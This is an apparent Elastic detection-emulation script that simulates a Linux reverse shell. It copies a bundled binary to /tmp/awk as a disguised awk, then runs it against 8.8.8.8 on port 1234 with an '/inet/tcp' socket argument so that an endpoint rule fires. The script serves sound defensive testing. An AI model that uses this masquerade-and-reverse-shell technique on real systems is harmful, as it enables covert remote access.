# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys

from . import RtaMetadata, common

metadata = RtaMetadata(
    uuid="d768af98-4e0b-451a-bc29-04b0be110ee5",
    platforms=["linux"],
    endpoint=[
        {"rule_name": "Linux Reverse Shell via Suspicious Utility", "rule_id": "c71b9783-ca42-4532-8eb3-e8f2fe32ff39"},
    ],
    siem=[],
    techniques=["T1059", "T1071"],
)


@common.requires_os(metadata.platforms)
def main() -> None:
    common.log("Creating a fake awk executable..")
    masquerade = "/tmp/awk"
    source = common.get_path("bin", "netcon_exec_chain.elf")
    common.copy_file(source, masquerade)
    common.log("Granting execute permissions...")
    common.execute(["chmod", "+x", masquerade])
    commands = [masquerade, "chain", "-h", "8.8.8.8", "-p", "1234", "-c", "/inet/tcp/1234"]
    common.log("Simulating reverse shell activity..")
    common.execute([*commands], timeout=5, kill=True)
    common.log("Reverse shell simulation successful!")
    common.log("Cleaning...")
    common.remove_file(masquerade)
    common.log("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
